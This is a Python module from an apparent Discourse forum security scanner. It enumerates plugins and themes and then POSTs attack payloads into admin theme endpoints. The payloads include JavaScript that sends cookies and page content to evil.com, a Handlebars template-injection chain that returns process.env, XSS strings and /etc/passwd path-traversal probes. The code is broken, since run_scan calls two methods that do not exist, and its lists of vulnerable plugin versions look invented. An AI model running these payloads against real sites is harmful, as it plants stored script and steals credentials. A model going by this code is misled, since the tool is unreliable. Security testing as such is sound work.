#!/usr/bin/env python3
"""
Discourse Security Scanner - Plugin Security Module

Tests security issues in Discourse plugins and themes
"""

import re
import time
import json
import base64
from urllib.parse import urljoin, quote
from bs4 import BeautifulSoup
from .utils import extract_csrf_token, make_request

class PluginModule:
    """Plugin security testing module for Discourse forums"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'module_name': 'Plugin Security Testing',
            'target': scanner.target_url,
            'plugins_found': [],
            'themes_found': [],
            'plugin_vulnerabilities': [],
            'theme_vulnerabilities': [],
            'outdated_plugins': [],
            'dangerous_permissions': [],
            'plugin_file_access': [],
            'theme_injection': []
        }
        
    def run_scan(self):
        """Run complete plugin security scan"""
        print(f"\n{self.scanner.colors['info']}[*] Starting plugin security scan...{self.scanner.colors['reset']}")
        
        # Plugin keşfi
        self._discover_plugins()
        
        # Theme keşfi
        self._discover_themes()
        
        # Plugin vulnerabilities
        self._check_plugin_vulnerabilities()
        
        # Theme vulnerabilities
        self._check_theme_vulnerabilities()
        
        # Outdated plugin check
        self._check_outdated_plugins()
        
        # Tehlikeli izinler
        self._check_dangerous_permissions()
        
        # Dosya erişim testleri
        self._test_plugin_file_access()
        
        # Theme injection testleri
        self._test_theme_injection()
        
        return self.results
    
    def _discover_plugins(self):
        """Discover installed plugins"""
        print(f"{self.scanner.colors['info']}[*] Scanning installed plugins...{self.scanner.colors['reset']}")
        
        # Admin plugins sayfası
        admin_plugins_url = urljoin(self.scanner.target_url, '/admin/plugins')
        response = make_request(self.scanner.session, 'GET', admin_plugins_url)
        
        if response and response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Plugin listesi
            plugin_elements = soup.find_all('div', class_='admin-plugin-item')
            for element in plugin_elements:
                plugin_info = self._extract_plugin_info(element)
                if plugin_info:
                    self.results['plugins_found'].append(plugin_info)
        
        # API üzerinden plugin listesi
        api_plugins_url = urljoin(self.scanner.target_url, '/admin/plugins.json')
        response = make_request(self.scanner.session, 'GET', api_plugins_url)
        
        if response and response.status_code == 200:
            try:
                data = response.json()
                if 'plugins' in data:
                    for plugin in data['plugins']:
                        plugin_info = {
                            'name': plugin.get('name', 'Unknown'),
                            'version': plugin.get('version', 'Unknown'),
                            'enabled': plugin.get('enabled', False),
                            'url': plugin.get('url', ''),
                            'author': plugin.get('author', 'Unknown')
                        }
                        self.results['plugins_found'].append(plugin_info)
            except json.JSONDecodeError:
                pass
        
        # Common plugin paths
        common_plugins = [
            'discourse-chat-integration',
            'discourse-solved',
            'discourse-voting',
            'discourse-calendar',
            'discourse-data-explorer',
            'discourse-sitemap',
            'discourse-oauth2-basic',
            'discourse-saml',
            'discourse-ldap-auth',
            'discourse-akismet',
            'discourse-math',
            'discourse-spoiler-alert',
            'discourse-checklist',
            'discourse-assign'
        ]
        
        for plugin in common_plugins:
            plugin_url = urljoin(self.scanner.target_url, f'/plugins/{plugin}')
            response = make_request(self.scanner.session, 'GET', plugin_url)
            
            if response and response.status_code == 200:
                self.results['plugins_found'].append({
                    'name': plugin,
                    'version': 'Unknown',
                    'enabled': True,
                    'detection_method': 'path_enumeration'
                })
    
    def _discover_themes(self):
        """Discover installed themes"""
        print(f"{self.scanner.colors['info']}[*] Scanning installed themes...{self.scanner.colors['reset']}")
        
        # Admin themes sayfası
        admin_themes_url = urljoin(self.scanner.target_url, '/admin/customize/themes')
        response = make_request(self.scanner.session, 'GET', admin_themes_url)
        
        if response and response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Theme listesi
            theme_elements = soup.find_all('div', class_='theme-list-item')
            for element in theme_elements:
                theme_info = self._extract_theme_info(element)
                if theme_info:
                    self.results['themes_found'].append(theme_info)
        
        # API üzerinden theme listesi
        api_themes_url = urljoin(self.scanner.target_url, '/admin/themes.json')
        response = make_request(self.scanner.session, 'GET', api_themes_url)
        
        if response and response.status_code == 200:
            try:
                data = response.json()
                if 'themes' in data:
                    for theme in data['themes']:
                        theme_info = {
                            'name': theme.get('name', 'Unknown'),
                            'id': theme.get('id', 0),
                            'default': theme.get('default', False),
                            'user_selectable': theme.get('user_selectable', False),
                            'color_scheme': theme.get('color_scheme', {})
                        }
                        self.results['themes_found'].append(theme_info)
            except json.JSONDecodeError:
                pass
    
    def _test_plugin_vulnerabilities(self):
        """Test for plugin-specific vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Testing plugin vulnerabilities...{self.scanner.colors['reset']}")
        
        for plugin in self.results['plugins_found']:
            plugin_name = plugin.get('name', '')
            
            # Known vulnerable plugins
            vulnerable_plugins = {
                'discourse-chat-integration': ['XSS via webhook', 'SSRF via external API'],
                'discourse-data-explorer': ['SQL Injection', 'Information Disclosure'],
                'discourse-oauth2-basic': ['Authentication Bypass', 'Token Leakage'],
                'discourse-saml': ['XML External Entity', 'Authentication Bypass'],
                'discourse-ldap-auth': ['LDAP Injection', 'Authentication Bypass']
            }
            
            if plugin_name in vulnerable_plugins:
                for vuln in vulnerable_plugins[plugin_name]:
                    self.results['plugin_vulnerabilities'].append({
                        'plugin': plugin_name,
                        'vulnerability': vuln,
                        'severity': 'High',
                        'description': f'{vuln} vulnerability in {plugin_name}'
                    })
            
            # Test plugin endpoints
            self._test_plugin_endpoints(plugin_name)
    
    def _test_theme_vulnerabilities(self):
        """Test for theme-specific vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Testing theme vulnerabilities...{self.scanner.colors['reset']}")
        
        for theme in self.results['themes_found']:
            theme_id = theme.get('id', 0)
            theme_name = theme.get('name', '')
            
            # Test theme CSS injection
            self._test_theme_css_injection(theme_id, theme_name)
            
            # Test theme JS injection
            self._test_theme_js_injection(theme_id, theme_name)
            
            # Test theme template injection
            self._test_theme_template_injection(theme_id, theme_name)
    
    def _test_plugin_endpoints(self, plugin_name):
        """Test plugin-specific endpoints"""
        plugin_endpoints = {
            'discourse-chat-integration': ['/chat-integration/webhook', '/chat-integration/admin'],
            'discourse-data-explorer': ['/admin/plugins/explorer', '/admin/plugins/explorer/queries'],
            'discourse-calendar': ['/calendar', '/calendar/events'],
            'discourse-voting': ['/voting', '/voting/vote']
        }
        
        if plugin_name in plugin_endpoints:
            for endpoint in plugin_endpoints[plugin_name]:
                url = urljoin(self.scanner.target_url, endpoint)
                response = make_request(self.scanner.session, 'GET', url)
                
                if response:
                    if response.status_code == 200:
                        # Check for sensitive information
                        if any(keyword in response.text.lower() for keyword in ['password', 'token', 'secret', 'key']):
                            self.results['plugin_vulnerabilities'].append({
                                'plugin': plugin_name,
                                'endpoint': endpoint,
                                'vulnerability': 'Information Disclosure',
                                'severity': 'Medium',
                                'description': f'Sensitive information exposed at {endpoint}'
                            })
    
    def _test_theme_css_injection(self, theme_id, theme_name):
        """Test for CSS injection in themes"""
        css_payloads = [
            'body{background:url("javascript:alert(1)");}',
            '@import "javascript:alert(1)";',
            'body{-moz-binding:url("data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22http://www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Balert(1)%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/binding%3E%3C/bindings%3E");}',
            'body{background:url("data:text/html,<script>alert(1)</script>");}']
        
        for payload in css_payloads:
            # Test CSS upload/modification
            css_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/css')
            data = {'css': payload}
            response = make_request(self.scanner.session, 'POST', css_url, data=data)
            
            if response and 'success' in response.text.lower():
                self.results['theme_vulnerabilities'].append({
                    'theme': theme_name,
                    'vulnerability': 'CSS Injection',
                    'severity': 'High',
                    'payload': payload,
                    'description': 'CSS injection possible in theme customization'
                })
    
    def _test_theme_js_injection(self, theme_id, theme_name):
        """Test for JavaScript injection in themes"""
        js_payloads = [
            'alert("XSS")',
            'document.location="http://evil.com/"+document.cookie',
            'fetch("/admin/users.json").then(r=>r.json()).then(d=>console.log(d))',
            'new Image().src="http://evil.com/steal?"+btoa(document.body.innerHTML)'
        ]
        
        for payload in js_payloads:
            # Test JS upload/modification
            js_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/javascript')
            data = {'javascript': payload}
            response = make_request(self.scanner.session, 'POST', js_url, data=data)
            
            if response and 'success' in response.text.lower():
                self.results['theme_vulnerabilities'].append({
                    'theme': theme_name,
                    'vulnerability': 'JavaScript Injection',
                    'severity': 'Critical',
                    'payload': payload,
                    'description': 'JavaScript injection possible in theme customization'
                })
    
    def _test_theme_template_injection(self, theme_id, theme_name):
        """Test for template injection in themes"""
        template_payloads = [
            '{{constructor.constructor("alert(1)")()}}',
            '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return JSON.stringify(process.env);"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
            '{{{constructor.constructor("alert(1)")()}}}',
            '{{lookup (lookup this "constructor") "constructor"}}'
        ]
        
        for payload in template_payloads:
            # Test template modification
            template_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/templates')
            data = {'template': payload}
            response = make_request(self.scanner.session, 'POST', template_url, data=data)
            
            if response and 'success' in response.text.lower():
                self.results['theme_vulnerabilities'].append({
                    'theme': theme_name,
                    'vulnerability': 'Template Injection',
                    'severity': 'Critical',
                    'payload': payload,
                    'description': 'Server-side template injection possible in theme templates'
                })
    
    def _check_outdated_plugins(self):
        """Check for outdated plugins"""
        print(f"{self.scanner.colors['info']}[*] Güncel olmayan plugin'ler kontrol ediliyor...{self.scanner.colors['reset']}")
        
        # Known vulnerable versions
        vulnerable_versions = {
            'discourse-chat-integration': ['1.0.0', '1.1.0'],
            'discourse-data-explorer': ['0.1.0', '0.2.0'],
            'discourse-oauth2-basic': ['1.0.0'],
            'discourse-saml': ['1.0.0', '1.1.0']
        }
        
        for plugin in self.results['plugins_found']:
            plugin_name = plugin.get('name', '')
            plugin_version = plugin.get('version', '')
            
            if plugin_name in vulnerable_versions:
                if plugin_version in vulnerable_versions[plugin_name]:
                    self.results['outdated_plugins'].append({
                        'plugin': plugin_name,
                        'current_version': plugin_version,
                        'vulnerability': 'Outdated Version',
                        'severity': 'High',
                        'description': f'{plugin_name} version {plugin_version} has known vulnerabilities'
                    })
    
    def _check_dangerous_permissions(self):
        """Check for dangerous plugin permissions"""
        print(f"{self.scanner.colors['info']}[*] Tehlikeli plugin izinleri kontrol ediliyor...{self.scanner.colors['reset']}")
        
        dangerous_permissions = [
            'file_system_access',
            'database_access',
            'admin_privileges',
            'user_impersonation',
            'external_requests'
        ]
        
        for plugin in self.results['plugins_found']:
            plugin_name = plugin.get('name', '')
            
            # Check plugin manifest for permissions
            manifest_url = urljoin(self.scanner.target_url, f'/plugins/{plugin_name}/plugin.rb')
            response = make_request(self.scanner.session, 'GET', manifest_url)
            
            if response and response.status_code == 200:
                for permission in dangerous_permissions:
                    if permission in response.text.lower():
                        self.results['dangerous_permissions'].append({
                            'plugin': plugin_name,
                            'permission': permission,
                            'severity': 'High',
                            'description': f'{plugin_name} has dangerous permission: {permission}'
                        })
    
    def _test_plugin_file_access(self):
        """Test plugin file access vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Plugin dosya erişim açıkları test ediliyor...{self.scanner.colors['reset']}")
        
        file_access_paths = [
            '/plugins/../../etc/passwd',
            '/plugins/../../../etc/passwd',
            '/plugins/..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/plugins/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '/plugins/....//....//etc/passwd'
        ]
        
        for path in file_access_paths:
            url = urljoin(self.scanner.target_url, path)
            response = make_request(self.scanner.session, 'GET', url)
            
            if response and response.status_code == 200:
                if any(keyword in response.text.lower() for keyword in ['root:', 'daemon:', 'bin:', 'sys:']):
                    self.results['plugin_file_access'].append({
                        'path': path,
                        'vulnerability': 'Directory Traversal',
                        'severity': 'Critical',
                        'description': f'File system access possible via {path}'
                    })
    
    def _test_theme_injection(self):
        """Test theme injection vulnerabilities"""
        print(f"{self.scanner.colors['info']}[*] Tema injection açıkları test ediliyor...{self.scanner.colors['reset']}")
        
        injection_payloads = [
            '<script>alert("XSS")</script>',
            '{{constructor.constructor("alert(1)")()}}',
            '${alert("XSS")}',
            '#{alert("XSS")}',
            '<img src=x onerror=alert("XSS")>'
        ]
        
        for theme in self.results['themes_found']:
            theme_id = theme.get('id', 0)
            
            for payload in injection_payloads:
                # Test theme settings injection
                settings_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/settings')
                data = {'setting_value': payload}
                response = make_request(self.scanner.session, 'POST', settings_url, data=data)
                
                if response and 'success' in response.text.lower():
                    self.results['theme_injection'].append({
                        'theme_id': theme_id,
                        'vulnerability': 'Theme Settings Injection',
                        'severity': 'High',
                        'payload': payload,
                        'description': 'Code injection possible via theme settings'
                    })
    
    def _extract_plugin_info(self, element):
        """Extract plugin information from HTML element"""
        try:
            name = element.find('h3').text.strip() if element.find('h3') else 'Unknown'
            version = element.find('span', class_='version').text.strip() if element.find('span', class_='version') else 'Unknown'
            enabled = 'enabled' in element.get('class', [])
            
            return {
                'name': name,
                'version': version,
                'enabled': enabled,
                'detection_method': 'admin_page'
            }
        except:
            return None
    
    def _extract_theme_info(self, element):
        """Extract theme information from HTML element"""
        try:
            name = element.find('h4').text.strip() if element.find('h4') else 'Unknown'
            theme_id = element.get('data-theme-id', 0)
            default = 'default' in element.get('class', [])
            
            return {
                'name': name,
                'id': int(theme_id) if theme_id else 0,
                'default': default,
                'detection_method': 'admin_page'
            }
        except:
            return None